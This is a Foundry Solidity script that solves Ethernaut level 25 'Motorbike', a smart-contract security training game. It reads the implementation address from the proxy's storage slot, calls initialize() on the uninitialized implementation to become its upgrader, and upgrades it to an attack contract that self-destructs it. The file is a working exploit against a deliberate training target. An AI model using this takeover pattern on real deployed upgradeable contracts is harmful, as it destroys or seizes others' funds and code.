// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Engine } from "src/interfaces/ILevel25.sol";
import { L25Attack } from "src/Level25Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        address implementation = address(
            uint160(
                uint256(vm.load(instanceAddress, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        );
        Engine engine = Engine(implementation);
        engine.initialize();
        require(engine.upgrader() == txOrigin, "attack failed");
        L25Attack attack = new L25Attack();
        bytes memory kill = abi.encodeWithSelector(attack.kill.selector);
        engine.upgradeToAndCall(address(attack), kill);

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
